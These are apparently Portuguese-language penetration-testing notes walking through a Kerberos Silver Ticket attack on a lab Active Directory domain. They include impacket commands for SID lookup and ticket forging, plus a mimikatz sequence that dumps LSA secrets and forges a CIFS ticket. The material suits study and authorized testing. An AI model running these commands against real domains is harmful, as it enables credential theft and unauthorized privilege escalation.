SiverTicket
========================

Até aqui a gente já deve obter as credenciais da conta SPN seguindo o que está escrito na página anterior. ([Kerberoasting](Kerberoasting.md))

No entanto, é necessário mais algumas informações pra que a gente consiga fazer o silver ticket, que consiste em gerar um ticket de SPN com as permissões que quisermos (full que seria o default das ferramentas, ou podemos setar as quais quisermos) para obter versatilidade nos recursos de rede para escalada de privilégio.

### 1 - Hash NTLM do SPN

Então precisaremos do hash nt da senha do serviço spn:

```
iconv -f ASCII -t UTF-16LE <(printf "Password") | openssl dgst -md4
```

ou

```
python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "Password".encode("utf-16le")).digest()))'
```

### 2 - Domain SID

Outra informação que precisamos é o domain SID que podemos obter de diversas formas, sendo elas

#### via RPC

```
rpcclient -U user <hostname>
lookupnames username
```

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>Domain SID</p></figcaption></figure>

#### via impacket (remotely)

```
impacket-getPac domain/username:password -targetUser username
##Exemplo
impacket-getPac scrm.local/ksimpson:ksimpson -targetUser ksimpson
```

### 3 - SPN

O nome do SPN basicamente já teremos seguindo os passos anteriores documentados em [Kerberoasting](Kerberoasting.md).

Depois disso, podemos gerar o silver ticket de maneira remota ou local na máquina da vítima:

#### impacket

```
impacket-ticketer -spn 'MSSQLSvc/dc1.scrm.local:1433' -domain domain.name -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -nthash ntlm_da_senha_do_spn -dc-ip hostname.dodc adm
```

Exemplo

```
impacket-ticketer -spn 'MSSQLSvc/dc1.scrm.local:1433' -domain scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -nthash b999a16500b87d17ec7f2e2a68778f05 -dc-ip dc1.scrm.local adm
```

FAZENDO COM O HASH DE SENHA DA MÁQUINA

```
mimikatz.exe
privilege::debug
lsadump::lsa /patch
kerberos::golden /user:admin /domain:scrm.local /sid:S-1-5-21-2743207045-1827831105-2542523200 /target:DC1.scrm.local /service:cifs /rc4:a4ce9e577c1298c759340f09b3546950 /ticket:c:\temp\test_cifs.kirbi
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

